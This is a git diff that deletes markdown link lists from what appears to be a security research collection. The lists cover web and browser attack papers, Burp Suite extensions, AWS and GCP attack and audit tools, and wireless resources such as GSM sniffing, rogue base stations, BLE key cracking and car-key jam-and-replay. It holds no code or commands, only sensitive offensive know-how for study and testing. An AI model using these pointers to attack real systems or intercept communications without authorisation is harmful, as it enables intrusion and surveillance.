-* Abstract —Return-oriented programming (ROP) has become the dominant form of vulnerability exploitation in both user and kernel space. Many defenses against ROP exploits exist, which can significantly raise the bar against attackers. Although protecting existing code, such as applications and the kernel, might be possible, taking countermeasures against dynamic code, i.e., code that is generated only at run-time, is much harder. Attackers have already started exploiting Just-in-Time (JIT) engines, available in all modern browsers, to introduce their (shell)code (either native code or re-usable gadgets) during JIT compilation, and then taking advantage of it. Recognizing this immediate threat, browser vendors started employing defenses for hardening their JIT engines. In this paper, we show that—no matter the employed defenses—JIT engines are still exploitable using solely dynamically generated gadgets. We demonstrate that dynamic ROP payload construction is possible in two modern web browsers without using any of the available gadgets contained in the browser binary or linked libraries. First, we exploit an open source JIT engine (Mozilla Firefox) by feeding it malicious JavaScript, which once processed generates all re- quired gadgets for running any shellcode successfully. Second, we exploit a proprietary JIT engine, the one in the 64-bit Microsoft Internet Explorer, which employs many undocumented, specially crafted defenses against JIT exploitation. We manage to bypass all of them and create the required gadgets for running any shellcode successfully. All defensive techniques are documented in this paper to assist other researchers. Furthermore, besides showing how to construct ROP gadgets on-the-fly, we also show how to discover them on-the-fly, rendering current randomization schemes ineffective. Finally, we perform an analysis of the most important defense currently employed, namely constant blinding , which shields all three-byte or larger immediate values in the JIT buffer for hindering the construction of ROP gadgets. Our analysis suggests that extending constant blinding to all immediate values (i.e., shielding 1-byte and 2-byte constants) dramatically decreases the JIT engine’s performance, introducing up to 80% additional instructions.
-
-[Cookieless Monster: Exploring the Ecosystem of Web-based Device Fingerprinting](http://securitee.org/files/cookieless_sp2013.pdf)
-* Abstract —The web has become an essential part of our society and is currently the main medium of information delivery. Billions of users browse the web on a daily basis, and there are single websites that have reached over one billion user accounts. In this environment, the ability to track users and their online habits can be very lucrative for advertising companies, yet very intrusive for the privacy of users. In this paper, we examine how web-based device fingerprint- ing currently works on the Internet. By analyzing the code of three popular browser-fingerprinting code providers, we reveal the techniques that allow websites to track users without the need of client-side identifiers. Among these techniques, we show how current commercial fingerprinting approaches use questionable practices, such as the circumvention of HTTP proxies to discover a user’s real IP address and the installation of intrusive browser plugins. At the same time, we show how fragile the browser ecosystem is against fingerprinting through the use of novel browser- identifying techniques. With so many different vendors involved in browser development, we demonstrate how one can use diversions in the browsers’ implementation to distinguish successfully not only the browser-family, but also specific major and minor versions. Browser extensions that help users spoof the user-agent of their browsers are also evaluated. We show that current commercial approaches can bypass the extensions, and, in addition, take advantage of their shortcomings by using them as additional fingerprinting features.
-
-[SSL/TLS Interception Proxies and Transitive Trust](http://media.blackhat.com/bh-eu-12/Jarmoc/bh-eu-12-Jarmoc-SSL_TLS_Interception-WP.pdf)
-* Secure Sockets Layer (SSL) [ 1 ] and its successor Transport Layer Security (TLS) [ 2 ] have become key components of the modern Internet . The privacy, integrity, and authenticity [ 3 ] [ 4 ] provided by these protocols are critical to allowing sensitive communications to occur . Without these systems, e - commerce, online banking , and business - to - business exchange of information would likely be far less frequent. Threat actors have also recognized the benefits of transport security, and they are increasingly turning to SSL to hide their activities . Advanced Persistent Threat ( APT ) attackers [ 5 ] , botnets [ 6 ] , and eve n commodity web attacks can leverage SSL encryption to evade detection. To counter these tactics, organizations are increasingly deploying security controls that intercept end - to - end encrypted channels. Web proxies, data loss prevention ( DLP ) systems, spec ialized threat detection solutions, and network intrusion prevention systems ( N IPS ) offer functionality to intercept, inspect , and filter encrypted traffic. Similar functionality is present in lawful intercept systems and solutions enabling the broad surve illance of encrypted communications by governments. Broadly classified as “SSL/TLS interception proxies ,” these solutions act as a “ man in the middle , ” violating the end - to - end security promises of SSL. This type of interception comes at a cost . Intercepti ng SSL - encrypted connections sacrifices a degree of privacy and integrity for the benefit of content inspection, often at the risk of authenticity and endpoint validation . Implementers and designers of SSL interception proxies should consider these risks and understand how their systems operate in unusual circumstances
-
-[Scriptless Attacks – Stealing the Pie Without Touching the Sill](http://www.syssec.rub.de/media/emma/veroeffentlichungen/2012/08/16/scriptlessAttacks-ccs2012.pdf)
-* Due to their high practical impact, Cross-Site Scripting (X SS) attacks have attracted a lot of attention from the security community members. In the same way, a plethora of more or less effective defense techniques have been proposed, ad- dressing the causes and effects of XSS vulnerabilities. As a result, an adversary often can no longer inject or even execute arbitrary scripting code in several real-life scen arios. In this paper, we examine the attack surface that remains after XSS and similar scripting attacks are supposedly mit- igated by preventing an attacker from executing JavaScript code. We address the question of whether an attacker really needs JavaScript or similar functionality to perform attac ks aiming for information theft. The surprising result is that an attacker can also abuse Cascading Style Sheets (CSS) in combination with other Web techniques like plain HTML, inactive SVG images or font files. Through several case studies, we introduce the so called scriptless attacks and demonstrate that an adversary might not need to execute code to preserve his ability to extract sensitive informati on from well protected websites. More precisely, we show that an attacker can use seemingly benign features to build side channel attacks that measure and exfiltrate almost arbitrar y data displayed on a given website. We conclude this paper with a discussion of potential mit- igation techniques against this class of attacks. In additi on, we have implemented a browser patch that enables a website to make a vital determination as to being loaded in a de- tached view or pop-up window. This approach proves useful for prevention of certain types of attacks we here discuss.
-
-[A Placement Vulnerability Study in Multi-Tenant Public Clouds](https://www.usenix.org/node/191017)
-
-[LFI2RCE (Local File Inclusion to Remote Code Execution) advanced exploitation: /proc shortcuts](http://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/)
-* This paper exposes the ability from the attacker standpoint to use /proc in order to exploit LFI (Local File Inclusion) vulnerabilities.
-
-[Cracking the Lens: Targeting HTTP's Hidden Attack Surface](https://portswigger.net/knowledgebase/papers/CrackingTheLens-whitepaper.pdf)
-
-[Browser Security White Paper - Cure53](https://browser-security.x41-dsec.de/X41-Browser-Security-White-Paper.pdf)
-
-
-
-
-
-----------------
-### <a name="misc">Miscellaneous</a>
-* [unindexed](https://github.com/mroth/unindexed/blob/master/README.md)
-	* The site is constantly searching for itself in Google, over and over and over, 24 hours a day. The instant it finds itself in Google search results, the site will instantaneously and irrevocably securely delete itself. Visitors can contribute to the public content of the site, these contributions will also be destroyed when the site deletes itself.
-
-[COWL: A Confinement System for the Web](http://cowl.ws/)
-	* Robust JavaScript confinement system for modern web browsers. COWL introduces label-based mandatory access control to browsing contexts (pages, iframes, etc.) in a way that is fully backward-compatible with legacy web content. 
-	* [Paper](http://www.scs.stanford.edu/~deian/pubs/stefan:2014:protecting.pdf)
-
-
-
-
-
-
-
-
-
-----------------
-### <a name="burp">Burp Stuff/Plugins</a>
-Burp Stuff/Plugins
-* Tutorials/Tips/Stuff
-	* [OWASP Top 10: Hacking Web Applications with Burp Suite - Chad Furman](https://www.youtube.com/watch?v=2p6twRRXK_o)
-	* [Burp Pro : Real-life tips and tricks](https://hackinparis.com/talk-nicolazs-gregoire)
-	* [Behind enemy lines: Bug hunting with Burp Infiltrator](http://blog.portswigger.net/2017/06/behind-enemy-lines-bug-hunting-with.html)
-	* [Automating Web Apps Input fuzzing via Burp Macros](http://blog.securelayer7.net/automating-web-apps-input-fuzzing-via-burp-macros/)
-
-* Plugins
-	* [Adapting Burp Extensions for Tailored Pentesting](http://blog.portswigger.net/2017/08/adapting-burp-extensions-for-tailored.html)
-	* [AuthMatrix](https://github.com/SecurityInnovation/AuthMatrix)
-		* AuthMatrix is a Burp Suite extension that provides a simple way to test authorization in web applications and web services. 
-	* [Autorize](https://github.com/Quitten/Autorize)
-		* Autorize is an automatic authorization enforcement detection extension for Burp Suite. It was written in Python by Barak Tawily, an application security expert, and Federico Dotta, a security expert at Mediaservice.net. Autorize was designed to help security testers by performing automatic authorization tests. With the last release now Autorize also perform automatic authentication tests.
-	* [backslash-powered-scanner](https://github.com/PortSwigger/backslash-powered-scanner)
-		* This extension complements Burp's active scanner by using a novel approach capable of finding and confirming both known and unknown classes of server-side injection vulnerabilities. Evolved from classic manual techniques, this approach reaps many of the benefits of manual testing including casual WAF evasion, a tiny network footprint, and flexibility in the face of input filtering.
-	* [burp-rest-api](https://github.com/vmware/burp-rest-api)
-		* A REST/JSON API to the Burp Suite security tool.  Upon successfully building the project, an executable JAR file is created with the Burp Suite Professional JAR bundled in it. When the JAR is launched, it provides a REST/JSON endpoint to access the Scanner, Spider, Proxy and other features of the Burp Suite Professional security tool.
-	* [BurpSmartBuster](https://github.com/pathetiq/BurpSmartBuster)
-		* Looks for files, directories and file extensions based on current requests received by Burp Suite
-	* [BurpKit](https://github.com/allfro/BurpKit)
-		* BurpKit is a BurpSuite plugin which helps in assessing complex web apps that render the contents of their pages dynamically. It also provides a bi-directional Script bridge API which allows users to create quick one-off BurpSuite plugin prototypes which can interact directly with the DOM and Burp's extender API.
-	* [BurpSmartBuster](https://github.com/pathetiq/BurpSmartBuster)
-		* A Burp Suite content discovery plugin that add the smart into the Buster!
-	* [collaborator-everywhere](https://github.com/PortSwigger/collaborator-everywhere)
-		* A Burp Suite Pro extension which augments your proxy traffic by injecting non-invasive headers designed to reveal backend systems by causing pingbacks to Burp Collaborator
-	* [C02](https://code.google.com/p/burp-co2/)
-		* Co2 includes several useful enhancements bundled into a single Java-based Burp Extension. The extension has it's own configuration tab with multiple sub-tabs (for each Co2 module). Modules that interact with other Burp tools can be disabled from within the Co2 configuration tab, so there is no need to disable the entire extension when using just part of the functionality.
-	* [distribute-damage](https://github.com/PortSwigger/distribute-damage)
-		* Designed to make Burp evenly distribute load across multiple scanner targets, this extension introduces a per-host throttle, and a context menu to trigger scans from. It may also come in useful for avoiding detection.
-	* [HUNT](https://github.com/bugcrowd/HUNT)
-		* HUNT is a Burp Suite extension to: 1. Identify common parameters vulnerable to certain vulnerability classes; 2. Organize testing methodologies inside of Burp Suite;
-	* [HUNT Burp Suite Extension](https://github.com/bugcrowdlabs/HUNT)
-		* HUNT Logo  HUNT is a Burp Suite extension to: 1. Identify common parameters vulnerable to certain vulnerability classes. 2. Organize testing methodologies inside of Burp Suite.
-	* [IntruderPayloads](https://github.com/1N3/IntruderPayloads/blob/master/README.md)
-	* [Office Open XML Editor - burp extension](https://github.com/maxence-schmitt/OfficeOpenXMLEditor)
-	* [ParrotNG - burp plugin](https://portswigger.net/bappstore/bapps/details/f99325340a404c67a8de2ce593824e0e)
-	* [PwnBack](https://github.com/k4ch0w/PwnBack)
-		* Burp Extender plugin that generates a sitemap of a website using Wayback Machine
-	* [SAML Raider](https://github.com/SAMLRaider/SAMLRaider)
-		* SAML Raider is a Burp Suite extension for testing SAML infrastructures. It contains two core functionalities: Manipulating SAML Messages and manage X.509 certificates.
-	* [swurg](https://github.com/AresS31/swurg)
-		* Parses Swagger files into the BurpSuite for automating RESTful API testing – approved by Burp for inclusion in their official BApp Store.
-
-
-
-
-
---------------------
-### <a name="aws"></a>AWS
-Amazon AWS
-* Attacking
-	*[Gone in 60 Milliseconds - Intrusion and Exfiltration in Server-less Architectures](https://media.ccc.de/v/33c3-7865-gone_in_60_milliseconds)
-		* More and more businesses are moving away from monolithic servers and turning to event-driven microservices powered by cloud function providers like AWS Lambda. So, how do we hack in to a server that only exists for 60 milliseconds? This talk will show novel attack vectors using cloud event sources, exploitabilities in common server-less patterns and frameworks, abuse of undocumented features in AWS Lambda for persistent malware injection, identifying valuable targets for pilfering, and, of course, how to exfiltrate juicy data out of a secure Virtual Private Cloud. 
-	*[Bucketlist](https://github.com/michenriksen/bucketlist)
-		* Bucketlist is a quick project I threw together to find and crawl Amazon S3 buckets and put all the data into a PostgreSQL database for querying.
-	*[Penetration Testing AWS Storage: Kicking the S3 Bucket](https://rhinosecuritylabs.com/penetration-testing/penetration-testing-aws-storage/)
-	*[AWS pwn](https://github.com/dagrz/aws_pwn)
-	* This is a collection of horribly written scripts for performing various tasks related to penetration testing AWS. Please don't be sad if it doesn't work for you. It might be that AWS has changed since a given tool was written or it might be that the code sux. Either way, please feel free to contribute. Most of this junk was written by Daniel Grzelak but there's been plenty of contributions, most notably Mike Fuller.
-* General
-* Securing
-	* [AWS Security Primer](https://cloudonaut.io/aws-security-primer/#fn:2)
-* Tools
-	* [Scout2](https://github.com/nccgroup/Scout2)
-		* Scout2 is a security tool that lets AWS administrators assess their environment's security posture. Using the AWS API, Scout2 gathers configuration data for manual inspection and highlights high-risk areas automatically. Rather than pouring through dozens of pages on the web, Scout2 supplies a clear view of the attack surface automatically.
-	
-
-
-------------------
-### <a name="gcc"></a>Google Compute Cloud/AppEngine
-Google Compute Cloud/AppEngine
-*[Introducing G-Scout](https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2017/august/introducing-g-scout/)
-	* G-Scout is a tool to help assess the security of Google Cloud Platform (GCP) environment configurations. By leveraging the Google Cloud API, G-Scout automatically gathers a variety of configuration data and analyzes this data to determine security risks. It produces HTML output.
-* [Google Cloud Platform Security Tool](https://github.com/nccgroup/G-Scout)
-* [G-Jacking AppEngine-based applications - HITB2014](https://conference.hitb.org/hitbsecconf2014ams/materials/D2T1-G-Jacking-AppEngine-based-Applications.pdf)
-
-
diff --git a/Draft/Wireless Networks & RF.md b/Draft/Wireless Networks & RF.md
deleted file mode 100755
index 55b7cdb..0000000
--- a/Draft/Wireless Networks & RF.md	
+++ /dev/null
@@ -1,382 +0,0 @@
-# Wireless Networks
-
-
-#### TOC
-* [General](#general)
-* [General Software Tools](#generalswt)
-* [Tutorials and Guides](#tut)
-* [Non Tutorial Writeups](#non-tut)
-* [Dongles/HW Tools](#dongles)
-* [Cellular Networks](#cn)
-* [Software Defined Radio](#sdr)
-* [802.11](#80211)
-* [RFID](#rfid)
-* [Zigbee](#zigbee)
-* [Bluetooth](#bt)
-* [Z-Wave](#zwave)
-* [RetroReflectors](#retroreflectors)
-* [Foxhunting & WarDriving](#fxh}
-* [General Blogs/Sites](#gbs)
-* [Talks/Presentations & Videos](#talks)
-* [Papers](#papers)
-
-* [Miscellaneous](#misc)
-
-
-
-#### Sort
-* Fix ToC
-http://umtrx.org/
-	* [Funtenna - Transmitter: XYZ Embedded device + RF Funtenna Payload](https://www.blackhat.com/docs/us-15/materials/us-15-Cui-Emanate-Like-A-Boss-Generalized-Covert-Data-Exfiltration-With-Funtenna.pdf)
-	* [CC1101-FSK](https://github.com/trishmapow/CC1101-FSK)
-		* Jam and replay attack on vehicle keyless entry systems.
-	* [Fluxion](https://github.com/wi-fi-analyzer/fluxion)
-		* Fluxion is a remake of linset by vk496 with (hopefully) less bugs and more functionality. It's compatible with the latest release of Kali (rolling). The attack is mostly manual, but experimental versions will automatically handle most functionality from the stable releases.
-
-	* [gr-lora](https://github.com/BastilleResearch/gr-lora)
-		* This is an open-source implementation of the LoRa CSS PHY, based on the blind signal analysis conducted by @matt-knight. The original research that guided this implementation may be found at https://github.com/matt-knight/research
-
-	* [An Auditing Tool for Wi-Fi or Wired Ethernet Connections - Matthew Sullivan](https://www.cookiecadger.com/wp-content/uploads/Cookie%20Cadger.pdf)
-	* [gr-nrsc5](https://github.com/argilo/gr-nrsc5)
-		* A GNU Radio implementation of HD Radio (NRSC-5)
-* [Taming Mr Hayes: Mitigating Signaling Based Attacks on Smartphones](https://www.mulliner.org/collin/academic/publications/mrhayes_mulliner_dsn2012.pdf)
-	* Malicious injection of cellular signaling traffic from mobile phones is an emerging security issue. The respective attacks can be performed by hijacked smartphones and by malware resident on mobile phones. Until today there are no protection mechanisms in place to prevent signaling based attacks other than implementing expensive additions to the cellular core network. In this work we present a protection system that resides on the mobile phone. Our solution works by partitioning the phone software stack into the application operating system and the communication partition. The application system is a standard fully featured Android sys tem. On the other side, communication to the cellular network is mediated by a flexible monitoring and enforcement system running on the communication partition. We implemented and evaluated our protection system on a real smartphone. Our evaluation shows that it can mitigate all currently know n signaling based attacks and in addition can protect users fr om cellular Trojans.
-Cellular Networks in Use: 
-* In use in North America:
-* In use in Europe:
-* In use in Asia:
-* In use in Africa:
-* In use in South America:
-##### End Cull
-
-
-
-
-
-
-
-
-
-### <a name="general">General</a>
-General
-* [Cyberspectrum SDR Meetups](https://www.youtube.com/watch?v=MFBkX4CNb08&list=PLPmwwVknVIiXGzKhtimTMjhcyppeRRsnE&index=3)
-* 101
-	* [IEEE 802.11 Tutorial](http://wow.eecs.berkeley.edu/ergen/docs/ieee.pdf)
-		* This document describes IEEE 802.11 Wireless Local Area Network (WLAN) Standard. It describes IEEE 802.11 MAC Layer in detail and it briefly mentions IEEE 802.11a, IEEE 802.11b physical layer standard and IEEE 802.11e MAC layer standard
-	* [FM and Bluetooth and Wifi Oh My Aaron Lafferty - Derbycon7](https://www.youtube.com/watch?v=_yAvPo4pVGA&index=5&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
-* Articles
-	* [sysmocom publicly releases Osmocom user manuals](https://www.sysmocom.de/news/sysmocom-publicly-releases-osmocom-user-manuals/)
-* Documentation
-	* [Management Frames Reference Sheet](http://download.aircrack-ng.org/wiki-files/other/managementframes.pdf)
-
-* Educational
-	* [Guide to Basics of Wireless Networking](http://documentation.netgear.com/reference/fra/wireless/TOC.html)
-	* [US Marine Antenna Handbook](http://www.zerobeat.net/r3403c.pdf)
-	* [So You Want To Hack Radios - A Primer On Wireless Reverse Engineering](http://conference.hitb.org/hitbsecconf2017ams/materials/D1T4%20-%20Marc%20Newlin%20and%20Matt%20Knight%20-%20So%20You%20Want%20to%20Hack%20Radios.pdf)
-	* [PHYs, MACs, and SDRs - Robert Ghilduta](http://www.irongeek.com/i.php?page=videos/defcon-wireless-village-2014/17-phys-macs-and-sdrs-robert-ghilduta)
-		* The talk will touch on a variety of topics and projects that have been under development including YateBTS, PHYs, MACs, and GNURadio modules. The talk will deal with GSM/LTE/WiFi protocol stacks.
-	* [Intro to SDR and RF Signal Analysis](https://www.elttam.com.au/blog/intro-sdr-and-rf-analysis/)
-* Testing
-	* [Introduction to Wireless Security Testing](http://www.grymoire.com/Security/Hardware.html)
-	* [RF Testing Methodology - NCCGroup](https://nccgroup.github.io/RFTM/)
-		* The RFTM is an Open Source, collaborative testing methodology. It is specifically written in a straightforward way, avoiding mathematics where possible and focussed on providing the information that security researchers and consultants need to know in order to effectively test systems that employ RF technologies.
-		* [Signals and Modulation](https://nccgroup.github.io/RFTM/basics.html)
-		* [Information Sources](https://nccgroup.github.io/RFTM/information_sources.html)
-		* [Receiving Signals](https://nccgroup.github.io/RFTM/receiving_signals.html)
-		* [Developing an FSK receiver step-by-step](https://nccgroup.github.io/RFTM/fsk_receiver.html)
-		* [Transmitting Data](https://nccgroup.github.io/RFTM/transmitting_data.html)
-		* [ Developing an FSK transmitter step-by-step](https://nccgroup.github.io/RFTM/fsk_transmitter.html)
-		* [Signals Identification](https://nccgroup.github.io/RFTM/signals_identification.html)	
-* General Videos
-	* [The Wireless World of the Internet of Things -  JP Dunning ".ronin"](http://www.irongeek.com/i.php?page=videos/derbycon4/t214-the-wireless-world-of-the-internet-of-things-jp-dunning-ronin)
-		* The Internet of Things brings all the hardware are home together. Most of these devices are controlled through wireless command and control network. But what kind of wireless? And what are the security is in place? This talk with cover the wireless tech used by the Internet of Things and some of the risks to your home or corporate security.
-
-
-
-
-
-
-APCO Project 25 (P25)
-	* [HOPE Number Nine (2012): Practical Insecurity in Encrypted Radio](https://www.youtube.com/watch?v=7or-_gT8TWU&app=desktop)
-		* APCO Project 25 ("P25") is a suite of wireless communications protocols used in the United States and elsewhere for public safety two-way (voice) radio systems. The protocols include security options in which voice and data traffic can be cryptographically protected from eavesdropping. This talk analyzes the security of P25 systems against passive and active adversaries. The panel found a number of protocol, implementation, and user interface weaknesses that routinely leak information to a passive eavesdropper or that permit highly efficient and difficult to detect active attacks. They found new "selective subframe jamming" attacks against P25, in which an active attacker with very modest resources can prevent specific kinds of traffic (such as encrypted messages) from being received, while emitting only a small fraction of the aggregate power of the legitimate transmitter. And, more significantly, they found that even passive attacks represent a serious immediate threat. In an over-the-air analysis conducted over a two year period in several U.S. metropolitan areas, they found that a significant fraction of the "encrypted" P25 tactical radio traffic sent by federal law enforcement surveillance operatives is actually sent in the clear - in spite of their users' belief that they are encrypted - and often reveals such sensitive data as the names of informants in criminal investigations.
-
-
-
-
-
-### <a name="bt">BlueTooth</a>
-* 101
-* Documentation
-* General
-	* [blueborne](https://www.armis.com/blueborne/)
-* Testing
-	* [Bluetooth Penetration Testing Framework - 2011](http://bluetooth-pentest.narod.ru/)
-	* [Hacking Bluetooth connections - hackingandsecurity](https://hackingandsecurity.blogspot.com/2017/08/hacking-bluetooth-connections.html?view=timeslide)
-* Tools
-	* [crackle](https://github.com/mikeryan/crackle)
-		* cracks BLE Encryption (AKA Bluetooth Smart).  crackle exploits a flaw in the BLE pairing process that allows an attacker to guess or very quickly brute force the TK (Temporary Key). With the TK and other data collected from the pairing process, the STK (Short Term Key) and later the LTK (Long Term Key) can be collected.
-	* [PyBT](https://github.com/mikeryan/PyBT)
-		* PyBT is a crappy half implementation of a Bluetooth stack in Python. At the moment it only supports Bluetooth Smart (BLE).
-* Writeups
-	* [Bluetooth NSA Toolset Talk/Attacks video](http://www.irongeek.com/i.php?page=videos/defcon-wireless-village-2014/15-the-nsa-playset-bluetooth-smart-attack-tools-mike-ryan)
-	* [Getting started with Bluetooth Low Energy on iOS](https://medium.com/@yostane/getting-started-with-bluetooth-low-energy-on-ios-ada3090fc9cc)
-
-
-
-
-
-### <a name="cn">Cellular Networks</a>
-Cellular Networks
-* 101
-* Articles
-	* [4G LTE Architecture and Security Concerns](http://www.secforce.com/blog/2014/03/4g-lte-architecture-and-security-concerns/)
-* Documentation
-* Educational
-	* [Demystifying the Mobile Network by Chuck McAuley](http://2014.video.sector.ca/video/110383258)
-		* Must watch video. Very informative.
-	* [SS7: Locate. Track. Manipulate.[31c3] by Tobias Engel (SnoopSnitch)](https://www.youtube.com/watch?v=lQ0I5tl0YLY)
-	* [LTE Security - How good is it?](http://csrc.nist.gov/news_events/cif_2015/research/day2_research_200-250.pdf)
-* SIM Cards
-	* [Rooting Sim Cards](https://media.blackhat.com/us-13/us-13-Nohl-Rooting-SIM-cards-Slides.pdf)
-	* [Secrets of Sim](http://www.hackingprojects.net/2013/04/secrets-of-sim.html)
-	* [Security mechanisms for the (U)SIM application toolkit; Test specification](https://portal.3gpp.org/desktopmodules/Specifications/SpecificationDetails.aspx?specificationId=1801#)
-	* [Small Tweaks do Not Help: Differential Power Analysis of MILENAGE Implementations in 3G/4G USIM Cards](https://www.blackhat.com/docs/us-15/materials/us-15-Yu-Cloning-3G-4G-SIM-Cards-With-A-PC-And-An-Oscilloscope-Lessons-Learned-In-Physical-Security-wp.pdf)
-	* [Osmocom SIMtrace](http://bb.osmocom.org/trac/wiki/SIMtrace)
-		* Osmocom SIMtrace is a software and hardware system for passively tracing SIM-ME communication between the SIM card and the mobile phone. 
-	* [4G Security: Hacking USB Modem and SIM Card via SMS](http://blog.ptsecurity.com/2014/12/4g-security-hacking-usb-modem-and-sim.html)
-	* [The Secret Life of SIM Cards - Defcon21](https://www.youtube.com/watch?v=31D94QOo2gY)
-	* [Adventures in Femtoland: 350 Yuan for Invaluable Fun](https://www.slideshare.net/arbitrarycode/adventures-in-femtoland-350-yuan-for-invaluable-fun)
-	* [Small Tweaks do Not Help: Differential Power Analysis of MILENAGE Implementations in 3G/4G USIM Cards](https://www.blackhat.com/docs/us-15/materials/us-15-Yu-Cloning-3G-4G-SIM-Cards-With-A-PC-And-An-Oscilloscope-Lessons-Learned-In-Physical-Security-wp.pdf)HTML Applications
-* Testing
-	* [The big GSM write-up; how to capture, analyze and crack GSM?](http://domonkos.tomcsanyi.net/?p=418)
-	* [StackOverflow post on intercepting GSM traffic](https://reverseengineering.stackexchange.com/questions/2962/intercepting-gsm-communications-with-an-usrp-and-gnu-radio)
-	* [NSA Playset - GSM Sniffing - Pierce&Loki - Defcon22](https://www.youtube.com/watch?v=tnn_qJGh1gc)
-	* [Mobile: Cellular Exploitation on a Global Scale The Rise & Fall of the Control](https://www.youtube.com/watch?v=HD1ngJ85vWM)
-	* [Sniffing GSM with RTL-SDR](https://www.youtube.com/watch?v=7OW0YOa6CYs)
-	* [Capturing and Cracking GSM traffic using a rtl-sdr](https://www.youtube.com/watch?v=TOl4Q4lyJTI)
-* Tools
-	* [Android IMSI-Catcher Detector (AIMSICD)](https://github.com/SecUpwN/Android-IMSI-Catcher-Detector)
-		* Android-based project to detect and avoid fake base stations (IMSI-Catchers) in GSM/UMTS Networks.
-	* [SnoopSnitch](https://opensource.srlabs.de/projects/snoopsnitch)
-		* SnoopSnitch is an Android app that collects and analyzes mobile radio data to make you aware of your mobile network security and to warn you about threats like fake base stations (IMSI catchers), user tracking and over-the-air updates. With SnoopSnitch you can use the data collected in the GSM Security Map at gsmmap.org and contribute your own data to GSM Map. This application currently only works on Android phones with a Qualcomm chipset and a stock Android ROM (or a suitable custom ROM with Qualcomm DIAG driver). It requires root priviliges to capture mobile network data.
-	* [gr-gsm](https://github.com/ptrkrysik/gr-gsm)
-		* Gnuradio blocks and tools for receiving GSM transmissions
-* Writeups/Talks
-	* [Mobile self-defense - Karsten Nohl](https://www.youtube.com/watch?v=GeCkO0fWWqc)
-	* [SS7: Locate. Track. Manipulate. You have a tracking device in your pocket](http://media.ccc.de/browse/congress/2014/31c3_-_6249_-_en_-_saal_1_-_201412271715_-_ss7_locate_track_manipulate_-_tobias_engel.html#video&t=424) 
-		* Companies are now selling the ability to track your phone number whereever you go. With a precision of up to 50 meters, detailed movement profiles can be compiled by somebody from the other side of the world without you ever knowing about it. But that is just the tip of the iceberg.
-	* [LTE Security - How good is it?](http://csrc.nist.gov/news_events/cif_2015/research/day2_research_200-250.pdf)
-	* [GSM MAP](http://gsmmap.org/#!/about) 
-		* The GSM Security Map compares the protection capabilities of mobile networks. Networks are rated in their protection capabilities relative to a reference network that implements all protection measures that have been seen ?in the wild?. The reference is regularly updated to reflect new protection ideas becoming commercially available. Networks, therefore, have to improve continuously to maintain their score, just as hackers are continuously improving their capabilities.
-	* [The Vodafone Access Gateway / UMTS Femto cell / Vodafone Sure Signal](https://wiki.thc.org/vodafone)
-	* [Building a portable GSM BTS using the Nuand bladeRF, Raspberry Pi and YateBTS (The Definitive and Step by Step Guide) ](https://blog.strcpy.info/2016/04/21/building-a-portable-gsm-bts-using-bladerf-raspberry-and-yatebts-the-definitive-guide/)
-	* [RTL-SDR Tutorial: Analyzing GSM with Airprobe and Wireshark](http://www.rtl-sdr.com/rtl-sdr-tutorial-analyzing-gsm-with-airprobe-and-wireshark/)
-		* The RTL-SDR software defined radio can be used to analyze cellular phone GSM signals, using Linux based tools Airprobe and Wireshark. This tutorial shows how I set up these tools for use with the RTL-SDR.
-	* [How To Build Your Own Rogue GSM BTS For Fun And Profit](https://www.evilsocket.net/2016/03/31/how-to-build-your-own-rogue-gsm-bts-for-fun-and-profit/)
-	* [Sniffing GSM with HackRF](https://web.archive.org/web/20130825000211/http://binaryrf.com/viewtopic.php?t=6&f=9)
-	* [GSM/GPRS Traffic Interception for Penetration Testing Engagements](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/may/gsmgprs-traffic-interception-for-penetration-testing-engagements/)
-	* [CampZer0 // Domonkos Tomcsányi: GSM - have we overslept the last wake-up call?](https://www.youtube.com/watch?v=3cnnQFP3VqE)
-	* [Intercepting GSM Traffic](https://www.blackhat.com/presentations/bh-dc-08/Steve-DHulton/Presentation/bh-dc-08-steve-dhulton.pdf)
-	* [GSM: SRSLY?](https://events.ccc.de/congress/2009/Fahrplan/events/3654.en.html)
-		* The worlds most popular radio system has over 3 billion handsets in 212 countries and not even strong encryption. Perhaps due to cold-war era laws, GSM's security hasn't received the scrutiny it deserves given its popularity. This bothered us enough to take a look; the results were surprising. From the total lack of network to handset authentication, to the "Of course I'll give you my IMSI" message, to the iPhone that really wanted to talk to us. It all came as a surprise ? stunning to see what $1500 of USRP can do. Add a weak cipher trivially breakable after a few months of distributed table generation and you get the most widely deployed privacy threat on the planet. Cloning, spoofing, man-in-the-middle, decrypting, sniffing, crashing, DoS'ing, or just plain having fun. If you can work a BitTorrent client and a standard GNU build process then you can do it all, too. Prepare to change the way you look at your cell phone, forever
-	* [Wideband GSM Sniffing [27C3]](https://www.youtube.com/watch?v=ZrbatnnRxFc)
-		* GSM is still the most widely used security technology in the world with a user base of 5 billion and a quickly growing number of critical applications. 26C3's rainbow table attack on GSM's A5/1 encryption convinced many users that GSM calls should be considered unprotected. The network operators, however, have not woken up to the threat yet. Perhaps the new capabilities to be unleashed this year -- like wide-band sniffing and real-time signal processing -- will wake them up. Now that GSM A5/1 encryption can be cracked in seconds, the complexity of wireless phone snooping moved to signal processing. Since GSM hops over a multitude of channels, a large chunk of radio spectrum needs to be analyzed, for example with USRPs, and decoded before storage or decoding. We demonstrate how this high bandwidth task can be achieved with cheap programmable phones.
-	* [29C3 GSM: Cell phone network review](https://www.youtube.com/watch?v=9wwco24EsHs)
-		* Did you notice 262 42 in your mobile phone network search list at the last CCC events? Did you and your friends buy SIM cards at the PoC and help test the network by calling each other, or by calling through the bridge to the DECT network services? Did you ever wonder about the details of this open source test network, set up by a team of volunteers in the middle of the city? We would like to tell you all the details of the cell phone network we operate at 29C3, and show you some fancy graphs based on the network activity! We will describe the process of setting up the test network we operate at 29C3, what legal and technical challenges we have faced, and we will describe the actual installation at the CCH. We will also compare this with the 262 42 test networks that were operated using the same open source software but otherwise very different installations at CCC Camp 2011 and 28C3. We will go on to show various statistics that we collect from the network while it has been running.
-
-
-
-
-
-### Dongles
-Dongles
-* [FunCube dongle](http://www.funcubedongle.com)
-* [RZUSBstick](http://www.atmel.com/tools/rzusbstick.aspx)
